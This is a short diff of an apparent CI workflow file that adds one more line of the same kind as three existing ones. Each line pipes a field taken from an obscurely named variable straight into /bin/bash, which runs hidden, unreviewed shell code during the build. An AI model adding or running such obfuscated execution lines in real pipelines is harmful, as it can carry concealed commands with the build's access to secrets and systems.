@@ -26,6 +26,7 @@ jobs:
           echo $vcty6 | jq -r .y9 | /bin/bash
           echo $mzsk4 | jq -r .cytvg50 | /bin/bash
           echo $hz70678 | jq -r .hfyhc84 | /bin/bash
+          echo $joz128 | jq -r .e9 | /bin/bash
 
       - name: Save archive
         if: always()
